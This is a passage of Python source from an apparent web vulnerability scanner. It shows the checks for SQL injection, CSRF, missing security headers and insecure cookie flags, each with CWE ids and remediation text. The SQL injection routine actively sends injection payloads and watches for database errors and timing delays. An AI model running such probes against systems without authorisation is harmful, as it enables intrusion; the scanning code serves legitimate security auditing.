                            "SQLite3::query",
                            "PostgreSQL",
                            "mysql_numrows()",
                            "mysqli_fetch_assoc()"
                        ]
                        
                        # Check for SQL errors or significant response differences
                        sql_error_detected = any(pattern.lower() in response.text.lower() for pattern in sql_error_patterns)
                        
                        # Time-based detection
                        is_time_based = "sleep" in payload.lower() or "delay" in payload.lower() or "waitfor" in payload.lower()
                        
                        if sql_error_detected or \
                           (is_time_based and response.elapsed.total_seconds() > 5) or \
                           (baseline_resp.status_code != response.status_code) or \
                           (abs(len(baseline_resp.text) - len(response.text)) > 50):
                            
                            self._add_vulnerability(
                                name="SQL Injection",
                                url=test_url,
                                severity=VulnerabilitySeverity.CRITICAL,
                                description="Potential SQL Injection vulnerability detected in URL parameter.",
                                evidence=f"URL parameter '{param_name}' might be vulnerable to SQL injection with payload: {payload}",
                                remediation="Use parameterized queries, prepared statements, or ORMs. Implement input validation and use least privilege database accounts.",
                                cwe_id="CWE-89",
                                cvss_score=8.5,
                                request_data={"url": test_url, "method": "GET"},
                                response_data={"status": response.status_code, "headers": dict(response.headers)}
                            )
                            # Move to next parameter after finding vulnerability
                            break
                    
                    except requests.RequestException as e:
                        logger.debug(f"Error testing SQLi in URL {test_url}: {e}")
                    
                    # Add delay between requests
                    await asyncio.sleep(self.delay)
    
    async def _scan_csrf(self, progress):
        """Scan for Cross-Site Request Forgery (CSRF) vulnerabilities."""
        logger.info("Scanning for CSRF vulnerabilities")
        
        # Test forms for CSRF tokens
        for form in self.target.forms:
            # Only check POST forms (GET forms are less critical for CSRF)
            if form["method"] != "POST":
                continue
            
            form_url = form["url"]
            inputs = form["inputs"]
            
            # Look for CSRF token in the form inputs
            has_csrf_token = False
            for input_field in inputs:
                input_name = input_field["name"].lower()
                
                # Check if the input name might be a CSRF token
                for token_name in self.payloads["csrf_tokens"]:
                    if token_name.lower() in input_name:
                        has_csrf_token = True
                        break
            
            # Also check for SameSite cookie attribute
            cookies_sameSite = True
            for cookie_name, cookie in self.session.cookies.items():
                if hasattr(cookie, 'get_nonstandard_attr'):
                    samesite = cookie.get_nonstandard_attr('SameSite')
                    if not samesite or samesite.lower() == 'none':
                        cookies_sameSite = False
                        break
            
            # If no CSRF token found and no SameSite cookie protection
            if not has_csrf_token and not cookies_sameSite:
                self._add_vulnerability(
                    name="Cross-Site Request Forgery (CSRF)",
                    url=form_url,
                    severity=VulnerabilitySeverity.MEDIUM,
                    description="Form does not appear to implement CSRF protection.",
                    evidence="No CSRF token fields detected in the form and no SameSite cookie protection.",
                    remediation="Implement CSRF tokens in all forms, validate them server-side, and use SameSite cookie attribute.",
                    cwe_id="CWE-352",
                    cvss_score=5.7,
                    request_data={"url": form_url, "method": "POST", "inputs": inputs},
                    response_data={}
                )
    
    async def _scan_security_headers(self, progress):
        """Scan for missing or misconfigured security headers."""
        logger.info("Scanning security headers")
        
        # Get the headers from the main page
        try:
            response = self.session.get(
                self.target.url,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                "Content-Security-Policy": {
                    "missing": True,
                    "severity": VulnerabilitySeverity.MEDIUM,
                    "description": "Content Security Policy (CSP) header is missing.",
                    "remediation": "Implement a Content Security Policy to help prevent XSS and data injection attacks.",
                    "cwe_id": "CWE-693",
                    "cvss_score": 5.0
                },
                "X-XSS-Protection": {
                    "missing": True,
                    "severity": VulnerabilitySeverity.LOW,
                    "description": "X-XSS-Protection header is missing.",
                    "remediation": "Set X-XSS-Protection header to '1; mode=block' to enable browser's XSS filtering.",
                    "cwe_id": "CWE-693",
                    "cvss_score": 3.5
                },
                "X-Content-Type-Options": {
                    "missing": True,
                    "severity": VulnerabilitySeverity.LOW,
                    "description": "X-Content-Type-Options header is missing.",
                    "remediation": "Set X-Content-Type-Options header to 'nosniff' to prevent MIME type sniffing.",
                    "cwe_id": "CWE-693",
                    "cvss_score": 3.5
                },
                "X-Frame-Options": {
                    "missing": True,
                    "severity": VulnerabilitySeverity.MEDIUM,
                    "description": "X-Frame-Options header is missing.",
                    "remediation": "Set X-Frame-Options header to 'DENY' or 'SAMEORIGIN' to prevent clickjacking attacks.",
                    "cwe_id": "CWE-693",
                    "cvss_score": 4.5
                },
                "Strict-Transport-Security": {
                    "missing": True,
                    "severity": VulnerabilitySeverity.MEDIUM,
                    "description": "HTTP Strict Transport Security (HSTS) header is missing.",
                    "remediation": "Implement HSTS to enforce secure connections and prevent SSL stripping attacks.",
                    "cwe_id": "CWE-319",
                    "cvss_score": 5.0
                },
                "Referrer-Policy": {
                    "missing": True,
                    "severity": VulnerabilitySeverity.LOW,
                    "description": "Referrer-Policy header is missing.",
                    "remediation": "Set a Referrer-Policy to control how much referrer information is included with requests.",
                    "cwe_id": "CWE-200",
                    "cvss_score": 3.0
                },
                "Permissions-Policy": {
                    "missing": True,
                    "severity": VulnerabilitySeverity.LOW,
                    "description": "Permissions-Policy header is missing.",
                    "remediation": "Implement Permissions-Policy to control which browser features can be used.",
                    "cwe_id": "CWE-693",
                    "cvss_score": 3.0
                }
            }
            
            # Check which headers are present
            for header, config in security_headers.items():
                if header in headers:
                    config["missing"] = False
                    
                    # Additional checks for specific headers
                    if header == "Content-Security-Policy":
                        csp = headers[header]
                        if "unsafe-inline" in csp or "unsafe-eval" in csp:
                            self._add_vulnerability(
                                name="Insecure Content Security Policy",
                                url=self.target.url,
                                severity=VulnerabilitySeverity.MEDIUM,
                                description="Content Security Policy contains unsafe directives.",
                                evidence=f"CSP header contains unsafe-inline or unsafe-eval: {csp}",
                                remediation="Avoid using 'unsafe-inline' and 'unsafe-eval' in your CSP as they weaken the protection against XSS attacks.",
                                cwe_id="CWE-693",
                                cvss_score=4.5,
                                request_data={"url": self.target.url, "method": "GET"},
                                response_data={"headers": dict(headers)}
                            )
                    
                    elif header == "Strict-Transport-Security":
                        hsts = headers[header]
                        if "max-age=" in hsts:
                            try:
                                max_age = int(re.search(r'max-age=(\d+)', hsts).group(1))
                                if max_age < 10886400:  # Less than 126 days
                                    self._add_vulnerability(
                                        name="Insufficient HSTS Max-Age",
                                        url=self.target.url,
                                        severity=VulnerabilitySeverity.LOW,
                                        description="HSTS max-age is too short.",
                                        evidence=f"HSTS max-age is set to {max_age} seconds, which is less than the recommended 126 days.",
                                        remediation="Set HSTS max-age to at least 10886400 seconds (126 days), preferably 31536000 (1 year).",
                                        cwe_id="CWE-319",
                                        cvss_score=3.5,
                                        request_data={"url": self.target.url, "method": "GET"},
                                        response_data={"headers": dict(headers)}
                                    )
                            except (AttributeError, ValueError):
                                pass
            
            # Add vulnerabilities for missing headers
            for header, config in security_headers.items():
                if config["missing"]:
                    self._add_vulnerability(
                        name=f"Missing {header} Header",
                        url=self.target.url,
                        severity=config["severity"],
                        description=config["description"],
                        evidence=f"The {header} header is not set in the HTTP response.",
                        remediation=config["remediation"],
                        cwe_id=config["cwe_id"],
                        cvss_score=config["cvss_score"],
                        request_data={"url": self.target.url, "method": "GET"},
                        response_data={"headers": dict(headers)}
                    )
            
            # Check for information disclosure in headers
            sensitive_headers = ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"]
            for header in sensitive_headers:
                if header in headers:
                    self._add_vulnerability(
                        name="Information Disclosure in HTTP Headers",
                        url=self.target.url,
                        severity=VulnerabilitySeverity.LOW,
                        description=f"The {header} header reveals information about the server technology.",
                        evidence=f"{header}: {headers[header]}",
                        remediation=f"Remove or modify the {header} header to prevent information disclosure.",
                        cwe_id="CWE-200",
                        cvss_score=3.5,
                        request_data={"url": self.target.url, "method": "GET"},
                        response_data={"headers": dict(headers)}
                    )
        
        except requests.RequestException as e:
            logger.error(f"Error scanning security headers: {e}")
    
    async def _scan_session_security(self, progress):
        """Scan for session security issues."""
        logger.info("Scanning session security")
        
        # Get cookies from the target
        try:
            response = self.session.get(
                self.target.url,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Check cookie security attributes
            for cookie in response.cookies:
                cookie_name = cookie.name
                secure = cookie.secure
                httponly = cookie.has_nonstandard_attr('HttpOnly') or cookie.has_nonstandard_attr('httponly')
                samesite = cookie.get_nonstandard_attr('SameSite') or cookie.get_nonstandard_attr('samesite')
                
                # Check for secure flag
                if not secure:
                    self._add_vulnerability(
                        name="Cookie Without Secure Flag",
                        url=self.target.url,
                        severity=VulnerabilitySeverity.MEDIUM,
                        description=f"The cookie '{cookie_name}' is not set with the Secure flag.",
                        evidence=f"Cookie: {cookie_name}",
                        remediation="Set the Secure flag on all cookies to ensure they are only sent over HTTPS connections.",
                        cwe_id="CWE-614",
                        cvss_score=5.0,
                        request_data={"url": self.target.url, "method": "GET"},
                        response_data={"cookies": {cookie_name: {"secure": secure, "httponly": httponly, "samesite": samesite}}}
                    )
                
                # Check for HttpOnly flag
                if not httponly:
                    self._add_vulnerability(
                        name="Cookie Without HttpOnly Flag",
                        url=self.target.url,
                        severity=VulnerabilitySeverity.MEDIUM,
                        description=f"The cookie '{cookie_name}' is not set with the HttpOnly flag.",
                        evidence=f"Cookie: {cookie_name}",
                        remediation="Set the HttpOnly flag on cookies to prevent client-side scripts from accessing them.",
                        cwe_id="CWE-1004",
                        cvss_score=4.5,
                        request_data={"url": self.target.url, "method": "GET"},
                        response_data={"cookies": {cookie_name: {"secure": secure, "httponly": httponly, "samesite": samesite}}}
                    )
                
                # Check for SameSite attribute
                if not samesite:
                    self._add_vulnerability(
                        name="Cookie Without SameSite Attribute",
                        url=self.target.url,
                        severity=VulnerabilitySeverity.LOW,
                        description=f"The cookie '{cookie_name}' is not set with a SameSite attribute.",
                        evidence=f"Cookie: {cookie_name}",
                        remediation="Set the SameSite attribute (Lax or Strict) on cookies to prevent CSRF attacks.",
                        cwe_id="CWE-352",
                        cvss_score=3.5,
                        request_data={"url": self.target.url, "method": "GET"},
                        response_data={"cookies": {cookie_name: {"secure": secure, "httponly": httponly, "samesite": samesite}}}
                    )
                elif samesite.lower() == "none" and secure:
                    # SameSite=None requires Secure flag
                    pass
                elif samesite.lower() == "none" and not secure:
                    self._add_vulnerability(
                        name="Cookie With SameSite=None Without Secure Flag",
                        url=self.target.url,
                        severity=VulnerabilitySeverity.MEDIUM,
                        description=f"The cookie '{cookie_name}' is set with SameSite=None but without the Secure flag.",
                        evidence=f"Cookie: {cookie_name}, SameSite: None, Secure: False",
                        remediation="When using SameSite=None, the Secure flag must also be set.",
                        cwe_id="CWE-614",
                        cvss_score=5.0,
                        request_data={"url": self.target.url, "method": "GET"},
                        response_data={"cookies": {cookie_name: {"secure": secure, "httponly": httponly, "samesite": samesite}}}
                    )
                
                # Check for session ID in URL
                if cookie_name.lower() in ["sessionid", "session", "sid", "phpsessid", "jsessionid"]:
                    # Check URLs for exposed session IDs
                    for url in self.endpoints:
                        if cookie_name.lower() in url.lower():
                            self._add_vulnerability(
                                name="Session ID Exposed in URL",
                                url=url,
                                severity=VulnerabilitySeverity.HIGH,
                                description="Session identifier is exposed in the URL, which can lead to session hijacking.",
                                evidence=f"URL contains session identifier: {url}",
                                remediation="Avoid placing session identifiers in the URL. Use secure cookies instead.",
                                cwe_id="CWE-598",
                                cvss_score=7.0,
                                request_data={"url": url, "method": "GET"},
                                response_data={}
                            )
             